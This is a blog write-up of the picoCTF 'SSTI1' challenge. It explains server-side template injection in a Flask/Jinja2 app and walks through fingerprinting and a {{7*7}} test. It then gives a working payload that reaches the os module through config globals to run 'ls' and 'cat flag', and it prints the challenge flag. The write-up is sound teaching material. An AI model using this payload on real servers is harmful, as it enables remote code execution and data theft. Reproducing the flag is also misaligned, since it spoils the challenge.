---
layout: post
title: "SSTI1"
date: 2025-08-05
categories: [PicoCTF]
tags: [picoctf, webexploitation,Easy]
---


# üß† Challenge Name: **SSTI**

## üìù Description
**I made a cool website where you can announce whatever you want! Try it out! I heard templating is a cool and modular way to build web apps!**

---

## ü§î What is SSTI?

**SSTI (Server-Side Template Injection)** occurs when user input is insecurely embedded into a server-side template.  
This allows an attacker to **inject template code** and potentially execute arbitrary code on the server.

---

## üß≠ Step-by-Step Approach

### 1. **Open the Website**
Go to the challenge URL and observe how it behaves.

### 2. **Test User Input**
Type something in the search bar. You'll see that it **echoes back** exactly what you typed.  
‚û°Ô∏è This is a sign of **SSTI (Server-Side Template Injection)**.

---

### 3. **Identify the Backend Technology**
Use this command in your terminal:

```bash
curl -i http://rescued-float.picoctf.net:53913/
```

**Sample Output:**
```
HTTP/1.1 200 OK
Server: Werkzeug/3.0.3 Python/3.8.10
Date: Tue, 05 Aug 2025 15:04:50 GMT
Content-Type: text/html; charset=utf-8
```

‚û°Ô∏è This tells us the backend is likely using **Flask** with **Jinja2** (common in Python apps).

---

### 4. **Test for Template Injection**

Try injecting a basic expression:

```jinja2
{% raw %}{{7*7}}{% endraw %}
```

‚û°Ô∏è If the result is `49`, it confirms the input is evaluated by a **template engine** (like Jinja2), which means **SSTI exists**.

---

### 5. **Exploit SSTI to Read Server Files**

Try this in the search bar:

```jinja2
{% raw %}{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}{% endraw %}
```

This command lists files in the server directory. If you see a file like `flag`, continue to the next step.

---

### 6. **Read the Flag**

Now run this to get the flag:

```jinja2
{% raw %}{{config.__class__.__init__.__globals__['os'].popen('cat flag').read()}}{% endraw %}
```

‚úÖ This prints the contents of the `flag` file on the website.

---

## üß† Payload Explanation

```jinja2
{% raw %}{{config.__class__.__init__.__globals__['os'].popen('cat flag').read()}}{% endraw %}
```

- `config`: a Flask object.
- `.__class__`: gets its class.
- `.__init__.__globals__`: accesses global variables (like imports).
- `['os']`: gets access to the `os` module.
- `.popen('cat flag').read()`: runs the `cat flag` command and reads the result.

This is **Remote Code Execution** through **SSTI** in a Python web app.

---

## üö® Real-World Impact

SSTI vulnerabilities are dangerous ‚Äî if not mitigated, they allow attackers to **execute arbitrary code on the server**, potentially leading to full system compromise.

Always validate and sanitize user input in server-side template engines.

---

## üèÅ Result

**picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_5c985a9a}**

---